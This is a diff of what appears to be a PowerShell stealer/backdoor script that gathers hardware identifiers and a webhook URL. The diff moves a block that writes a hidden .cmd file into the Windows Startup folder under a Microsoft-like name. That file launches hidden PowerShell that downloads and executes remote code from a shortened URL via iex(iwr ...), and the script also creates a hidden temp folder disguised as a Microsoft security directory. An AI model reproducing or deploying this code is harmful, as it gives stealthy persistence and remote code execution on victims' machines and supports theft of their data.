@@ -1,4 +1,5 @@
 #$webHookUrl='for dev xD'
+
 #####################################################################
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
 $webHookUrlPYTHON2="""$webHookUrl"""
@@ -13,12 +14,21 @@ $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
 md C:\windows\temp\Win.microsoft.Security.temp
 cls
+mkdir C:\Windows\Temp\Win.microsoft.Security.temp
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 cls
 #####################################################################
 
 #####################################################################
-cd C:\Windows\Temp\
+Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
+@echo off
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr shorturl.at/biVZ5).content)"
+#shorturl.at/biVZ5 look the website xD (just for a short url)
+attrib +h "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd"
+cls
+#####################################################################
+
+#####################################################################
 if (Test-Path "C:\Users\$env:username\AppData\Local\Programs\Python\Python311\python.exe") {
 }
 else {
@@ -35,15 +45,6 @@ else {
 python3 -m pip install threading
 python3 -m pip install thread
 
-#####################################################################
-
-#####################################################################
-Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
-@echo off
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr shorturl.at/biVZ5).content)"
-#shorturl.at/biVZ5 look the website xD (just for a short url)
-attrib +h "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd"
-cls
 #####################################################################
 
 #####################################################################
